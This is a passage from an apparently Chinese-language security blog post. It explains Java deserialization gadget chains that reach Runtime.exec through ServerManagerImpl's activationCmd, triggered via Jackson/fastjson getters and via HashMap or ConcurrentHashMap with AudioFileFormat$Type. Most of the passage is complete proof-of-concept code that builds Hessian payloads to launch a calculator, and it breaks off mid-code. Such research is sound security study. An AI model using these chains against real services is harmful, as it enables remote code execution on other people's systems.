+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">activate</span><span class="params">()</span> <span class="keyword">throws</span> org.omg.CORBA.SystemException</span><br><span class="line">&#123;</span><br><span class="line">    state = ACTIVATED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            printDebug(<span class="string">&quot;activate&quot;</span>, <span class="string">&quot;activating server&quot;</span>);</span><br><span class="line">        process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        deActivate();</span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            printDebug(<span class="string">&quot;activate&quot;</span>, <span class="string">&quot;throwing premature process exit&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> wrapper.unableToStartProcess() ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会执行<code>activationCmd</code></p>
+<p>直接赋值就行</p>
+<h3 id="final"><a class="markdownIt-Anchor" href="#final"></a> Final</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line"><span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span>createWithObjectNoArgsConstructor(ServerTableEntry.class);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="number">1</span>,serverTableEntry);</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;exit&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">setFieldValue(serverTableEntry,<span class="string">&quot;state&quot;</span>,<span class="number">2</span>);</span><br><span class="line">setFieldValue(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">serverManager.getActiveServers();</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251226011252107.png" alt="image-20251226011252107" /></p>
+<p>成功弹出计算机</p>
+<h2 id="fastjson或jackson触发getter"><a class="markdownIt-Anchor" href="#fastjson或jackson触发getter"></a> fastJson或Jackson触发getter</h2>
+<p>这个很常见了，直接上代码吧</p>
+<h3 id="jackson"><a class="markdownIt-Anchor" href="#jackson"></a> Jackson</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line">        <span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerTableEntry.class);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="number">1</span>,serverTableEntry);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;exit&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">        setFieldValue(serverTableEntry,<span class="string">&quot;state&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(serverManager);</span><br><span class="line">        node.toString();</span><br><span class="line"><span class="comment">//		或者</span></span><br><span class="line"><span class="comment">//      JSONObject jsonObject = new JSONObject();</span></span><br><span class="line"><span class="comment">//      jsonObject.put(&quot;key&quot;, serverManager);</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251226014138233.png" alt="image-20251226014138233" /></p>
+<h3 id="fastjson"><a class="markdownIt-Anchor" href="#fastjson"></a> fastJson</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line"><span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerTableEntry.class);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="number">1</span>,serverTableEntry);</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;exit&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">setFieldValue(serverTableEntry,<span class="string">&quot;state&quot;</span>,<span class="number">2</span>);</span><br><span class="line">setFieldValue(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">jsonArray.add(serverManager);</span><br><span class="line">jsonArray.toString();</span><br></pre></td></tr></table></figure>
+<h2 id="触发tostring"><a class="markdownIt-Anchor" href="#触发tostring"></a> 触发toString</h2>
+<p>这里的链子其实挺多的,这里给出几条</p>
+<h3 id="hashmap-audiofileformat-tostring"><a class="markdownIt-Anchor" href="#hashmap-audiofileformat-tostring"></a> HashMap-&gt;AudioFileFormat-&gt;toString</h3>
+<p>首先还是构造<code>HashMap-&gt;equals</code>，代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map1.put(<span class="string">&quot;aa&quot;</span>,jsonArray);</span><br><span class="line">map1.put(<span class="string">&quot;bB&quot;</span>,conEntry1);</span><br><span class="line">map2.put(<span class="string">&quot;aa&quot;</span>,conEntry1);</span><br><span class="line">map2.put(<span class="string">&quot;bB&quot;</span>,jsonArray);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">finalMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">finalMap.put(map1,<span class="string">&quot;&quot;</span>);</span><br><span class="line">finalMap.put(map2,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>然后走到<code>AudioFileFormat$Type#equals</code>。</p>
+<p><img src="../images/image-20251226014449868.png" alt="image-20251226014449868" /></p>
+<p>如图所示，<code>AudioFileFormat$Type#equals</code>中会调用任意<code>toString</code>从而触发<code>Jackson</code>或<code>fastjson</code>的<code>toString</code>方法。</p>
+<blockquote>
+<p><code>AudioFileFormat$Type</code> 是作为 <code>HashMap.equals()</code> 里的“被比较 key”，在反序列化过程中被隐式调用了 <code>Type.equals()</code>，而这个 <code>equals()</code> 里调用了 <code>toString()</code>，从而触发了 <code>JSONArray.toString()</code> → <code>ServerManagerImpl.getActiveServers()</code></p>
+</blockquote>
+<p>因此完整代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.corba.se.impl.activation.ServerManagerImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.corba.se.impl.activation.ServerTableEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap_AudioFileFormat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span>createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line">        <span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerTableEntry.class);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="number">0</span>, serverTableEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;exit&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">        setFieldValue(serverTableEntry,<span class="string">&quot;state&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(serverManager);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">conEntry1</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;javax.sound.sampled.AudioFileFormat$Type&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>,jsonArray);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>,conEntry1);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>,conEntry1);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>,jsonArray);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">finalMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        finalMap.put(map1,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        finalMap.put(map2,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Hessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(finalMap);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;Hessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithObjectNoArgsConstructor</span><span class="params">(Class&lt;T&gt; clzToInstantiate)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">T</span> <span class="variable">resObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            resObject = createWithConstructor(clzToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        setAccessible(objCons);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        setAccessible(sc);</span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(AccessibleObject member)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">versionStr</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">javaVersion</span> <span class="operator">=</span> Integer.parseInt(versionStr.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// not possible to quiet runtime warnings anymore...</span></span><br><span class="line">        <span class="comment">// see https://bugs.openjdk.java.net/browse/JDK-8210522</span></span><br><span class="line">        <span class="comment">// to understand impact on Permit (i.e. it does not work</span></span><br><span class="line">        <span class="comment">// anymore with Java &gt;= 12)</span></span><br><span class="line">        member.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251226015042980.png" alt="image-20251226015042980" /></p>
+<h3 id="concurrenthashmap-audiofileformat-tostring"><a class="markdownIt-Anchor" href="#concurrenthashmap-audiofileformat-tostring"></a> ConcurrentHashMap-&gt;AudioFileFormat-&gt;toString</h3>
+<p>这个和上面那个不同在于：</p>
+<p><strong>上一个是 <code>HashMap.equals → key.equals → AudioFileFormat$Type.equals → toString</code></strong><br />
+<strong>这个是 <code>ConcurrentHashMap.readObject → Node.equals → MapEntry.equals → key.equals → toString</code></strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.corba.se.impl.activation.ServerManagerImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.corba.se.impl.activation.ServerTableEntry;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcurrentHashMap_AudioFileFormat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ServerManagerImpl serverManager= createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line">        HashMap&lt;Integer, ServerTableEntry&gt; map =<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span>createWithObjectNoArgsConstructor( ServerTableEntry.class);</span><br><span class="line">        map.put(<span class="number">1</span>,serverTableEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;exit&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">        setFieldValue(serverTableEntry,<span class="string">&quot;state&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;key&quot;</span>, serverManager);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">conEntry</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;javax.sound.sampled.AudioFileFormat$Type&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">conEntry1</span> <span class="operator">=</span>createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap$MapEntry&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">conEntry2</span> <span class="operator">=</span>createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap$MapEntry&quot;</span>));</span><br><span class="line">        setFieldValue(conEntry1, <span class="string">&quot;key&quot;</span>, conEntry);</span><br><span class="line">        setFieldValue(conEntry1, <span class="string">&quot;val&quot;</span>, jsonObject);</span><br><span class="line">        setFieldValue(conEntry2, <span class="string">&quot;key&quot;</span>, jsonObject);</span><br><span class="line">        setFieldValue(conEntry2, <span class="string">&quot;val&quot;</span>, conEntry);</span><br><span class="line">        <span class="type">ConcurrentHashMap</span> <span class="variable">s</span> <span 